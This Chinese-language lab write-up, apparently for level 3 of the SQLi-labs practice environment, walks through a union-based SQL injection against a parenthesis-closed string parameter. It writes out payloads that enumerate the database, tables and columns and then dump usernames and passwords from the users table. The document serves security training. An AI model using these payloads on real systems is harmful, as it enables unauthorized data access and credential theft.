第三关 单引号括号闭合

先判断类型是字符型还是数字型。

id=1'

结果发现报错如下：

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1

可以看到有括号，说明是由括号闭合。

于是再输入：

id=1') -- -

发现正常返回id=1的用户数据。

输入： id=1') and 1=2 -- - 发现没有查询结果，说明存在注入点。

于是便开始注入，先通过order by看看有多少列

输入 id=1') order by 5 -- -,得到报错 Unknown column '5' in 'order clause' 说明不存在第五列，通过二分法查找，最终确定一共有3列。

然后再判断回显位 id=-1') union select 1,2,3 -- -

说明回显位在2，3。于是我们对这两个位置进行注入来获得信息。
爆库名
id=-1') union select 1,database(),3 -- -

可以知道库名为security

然后再根据库名去爆出表名。

id=-1') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' -- -

同理再爆列名

id=-1') union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' -- -

最后查询数据

id=-1') union select 1,group_concat(username),group_concat(password) from users order by id -- -
